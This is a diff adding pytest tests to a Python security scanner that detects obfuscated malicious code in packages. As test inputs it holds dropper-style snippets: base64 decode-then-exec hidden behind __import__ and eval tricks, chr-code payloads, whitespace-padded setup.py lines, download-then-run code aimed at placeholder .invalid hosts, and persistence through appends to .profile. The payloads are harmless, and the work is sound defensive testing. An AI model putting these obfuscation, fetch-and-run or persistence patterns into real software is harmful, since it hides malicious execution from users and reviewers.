@@ -18,6 +18,8 @@ from __future__ import annotations
 
 import ast
 
+import pytest
+
 from cordon_scanner.core.models import Capability
 from cordon_scanner.detect.pyast import PythonAnalyzer
 
@@ -239,3 +241,175 @@ class TestSpawnCommands:
         run shell rules over arbitrary bytes."""
         source = "import base64\nbase64." + DECODE + '("aWQgLXU=")'
         assert all(hit.command is None for hit in PythonAnalyzer.analyse(source))
+
+
+class TestImportByCall:
+    """`__import__("m").f` and `importlib.import_module("m").f` are `m.f`, and `builtins.exec` is
+    `exec` -- the spelling a dropper uses to keep `import base64` and `exec(` off the same line."""
+
+    @pytest.mark.parametrize(
+        "source",
+        [
+            '__import__("builtins").exec(__import__("base64").b64decode("cHJpbnQoMSk="))',
+            '__import__("builtins").exec(__import__("builtins").compile(__import__("base64").b64decode("cHJpbnQoMSk="), "<s>", "exec"))',
+            'exec(__import__("base64").b64decode("cHJpbnQoMSk="))',
+            'import importlib\nimportlib.import_module("builtins").eval(importlib.import_module("codecs").decode("cHJpbnQoMSk=", "base64"))',
+            "print('x')"
+            + " " * 300
+            + ';__import__("builtins").exec(__import__("base64").b64decode("cHJpbnQoMSk="))',
+        ],
+    )
+    def test_decode_then_execute_is_seen_through_the_call(self, tmp_path, source) -> None:
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        (tmp_path / "setup.py").write_text(
+            source + "\nfrom setuptools import setup\nsetup(name='x')\n", encoding="utf-8"
+        )
+        found = {
+            f.rule_id
+            for f in Scanner(Config.default().with_overrides(use_cache=False))
+            .scan(tmp_path)
+            .findings
+        }
+        assert "SUSPECT.DECODE_EXEC.001" in found
+
+
+def _capabilities(source: str, **options) -> set[tuple[Capability, str]]:
+    return {(hit.capability, hit.detail) for hit in PythonAnalyzer.analyse(source, **options)}
+
+
+class TestNamesReachedByEvaluation:
+    def test_eval_of_a_builtin_name_binds_that_builtin(self) -> None:
+        source = '_e = eval("\\145\\170\\145\\143")\n_e(__import__("base64").b64decode("cHJpbnQoMSk="))\n'
+        assert (Capability.EXECUTE, "exec") in _capabilities(source)
+
+    def test_eval_of_compiled_import_binds_the_module(self) -> None:
+        source = 'b = eval(compile("__import__(\'base64\')", "", "eval"))\nexec(b.b64decode("cHJpbnQoMSk="))\n'
+        assert (Capability.DECODE, "base64.b64decode") in _capabilities(source)
+
+    def test_tuple_assignment_binds_each_name(self) -> None:
+        source = 'x, y = eval("exec"), __import__("base64")\nx(y.b64decode("cHJpbnQoMSk="))\n'
+        found = _capabilities(source)
+        assert (Capability.EXECUTE, "exec") in found
+        assert (Capability.DECODE, "base64.b64decode") in found
+
+    def test_eval_of_a_computation_is_not_a_name(self) -> None:
+        assert not any(
+            c is Capability.EXECUTE and d == "1" for c, d in _capabilities('n = eval("1 + 1")\n')
+        )
+
+
+class TestCodeHeldInLiterals:
+    def test_code_written_to_a_file_is_read_as_code(self) -> None:
+        source = 'f = open("s.py", "w")\nf.write("import os\\nos.system(\'id\')\\n")\n'
+        assert any(
+            c is Capability.SPAWN and d.startswith("written code") for c, d in _capabilities(source)
+        )
+
+    def test_base64_of_a_literal_is_decoded_before_reading(self) -> None:
+        import base64 as b64
+
+        payload = b64.b64encode(b"import os\nos.system('id')\n").decode()
+        source = f'import base64\nP = "{payload}"\nopen("s.py", "wb").write(base64.b64decode(P))\n'
+        assert any(
+            c is Capability.SPAWN and d.startswith("written code") for c, d in _capabilities(source)
+        )
+
+    def test_a_literal_handed_to_exec_is_read(self) -> None:
+        source = "exec('import urllib.request as u;u.urlopen(\"https://example.invalid\")')\n"
+        assert any(
+            c is Capability.EGRESS and d.startswith("executed literal")
+            for c, d in _capabilities(source)
+        )
+
+    def test_prose_written_to_a_file_is_not_code(self) -> None:
+        source = 'open("README", "w").write("Run the installer (see docs) before use.")\n'
+        assert not any(d.startswith("written code") for _, d in _capabilities(source))
+
+    def test_test_material_can_turn_literal_reading_off(self) -> None:
+        source = "p.write_text(\"import base64\\neval(base64.b64decode('cHJpbnQoMSk='))\\n\")\n"
+        assert any(d.startswith("written code") for _, d in _capabilities(source))
+        assert not any(
+            d.startswith("written code") for _, d in _capabilities(source, follow_literals=False)
+        )
+
+
+class TestDownloadedThenRun:
+    @pytest.mark.parametrize(
+        "source",
+        [
+            'import urllib.request, subprocess\nurllib.request.urlretrieve("https://h.invalid/x", "/tmp/x.pyz")\n'
+            'subprocess.Popen(["python3", "/tmp/x.pyz"])\n',
+            'import urllib.request, subprocess\nP = "/tmp/t.pyz"\nwith urllib.request.urlopen("https://h.invalid") as r, open(P, "wb") as o:\n'
+            '    o.write(r.read())\nsubprocess.run(["python3", P])\n',
+            'import requests, subprocess, sys\nr = requests.get("https://h.invalid")\nopen("a.py", "wb").write(r.content)\n'
+            'subprocess.run([sys.executable, "a.py"])\n',
+            'import urllib.request, os\nurllib.request.urlretrieve("https://h.invalid/x", "/tmp/x")\nos.system("/tmp/x &")\n',
+        ],
+    )
+    def test_running_the_downloaded_file_is_fetch_exec(self, source) -> None:
+        assert any(c is Capability.FETCH_EXEC for c, _ in _capabilities(source))
+
+    @pytest.mark.parametrize(
+        "source",
+        [
+            'import urllib.request, subprocess\nurllib.request.urlretrieve("https://h.invalid/t.tgz", "t.tgz")\n'
+            'subprocess.run(["tar", "xzf", "t.tgz"])\n',
+            'import urllib.request, subprocess\nurllib.request.urlretrieve("https://h.invalid/d.csv", "d.csv")\n'
+            'subprocess.run(["wc", "-l", "other.csv"])\n',
+            'import subprocess, sys\nopen("gen.py", "w").write("print(1)")\nsubprocess.run([sys.executable, "gen.py"])\n',
+        ],
+    )
+    def test_naming_a_download_without_running_it_is_not(self, source) -> None:
+        assert not any(c is Capability.FETCH_EXEC for c, _ in _capabilities(source))
+
+
+class TestStartupFiles:
+    def test_only_import_lines_of_a_pth_are_code(self) -> None:
+        from cordon_scanner.detect.pyast import startup_lines
+
+        text = "/opt/src\nimport os; os.system('id')\n# note\n../vendor\n"
+        assert startup_lines(text).split("\n") == ["", "import os; os.system('id')", "", "", ""]
+        assert any(c is Capability.SPAWN for c, _ in _capabilities(startup_lines(text)))
+
+
+class TestCodeSpelledAsCharacterCodes:
+    def test_join_map_chr_folds(self) -> None:
+        codes = ", ".join(str(ord(c)) for c in "import os")
+        node = ast.parse(f'"".join(map(chr, [{codes}]))', mode="eval").body
+        assert PythonAnalyzer.constant(node) == "import os"
+
+    def test_chr_concatenation_folds(self) -> None:
+        node = ast.parse("chr(103) + chr(104) + 'p_'", mode="eval").body
+        assert PythonAnalyzer.constant(node) == "ghp_"
+
+    def test_executed_codes_are_read_as_code(self) -> None:
+        payload = "import os\nos.system('id')\n"
+        codes = ", ".join(str(ord(c)) for c in payload)
+        found = _capabilities(f'exec("".join(map(chr, [{codes}])))\n')
+        assert any(c is Capability.SPAWN and d.startswith("executed literal") for c, d in found)
+
+    def test_both_branches_of_a_conditional_literal_are_read(self) -> None:
+        source = 'import sys\nexec("import os; os.system(\'x\')" if sys.platform == "win32" else "pass")\n'
+        assert any(c is Capability.SPAWN for c, _ in _capabilities(source))
+
+
+class TestPersistenceThroughAnAssembledPath:
+    def test_a_comprehension_of_codes_folds(self) -> None:
+        node = ast.parse(
+            "''.join([chr(x) for x in [46, 112, 114, 111, 102, 105, 108, 101]])", mode="eval"
+        ).body
+        assert PythonAnalyzer.constant(node) == ".profile"
+
+    def test_appending_to_an_assembled_profile_is_persistence(self) -> None:
+        source = (
+            "p = ''.join([chr(x) for x in [46, 112, 114, 111, 102, 105, 108, 101]])\n"
+            "with open(f'/home/{user}/{p}', 'a') as fh:\n    fh.write(line)\n"
+        )
+        assert any(c is Capability.PERSIST for c, _ in _capabilities(source))
+
+    def test_reading_a_profile_is_not(self) -> None:
+        assert not any(
+            c is Capability.PERSIST for c, _ in _capabilities("open('/home/u/.pro' 'file').read()\n")
+        )
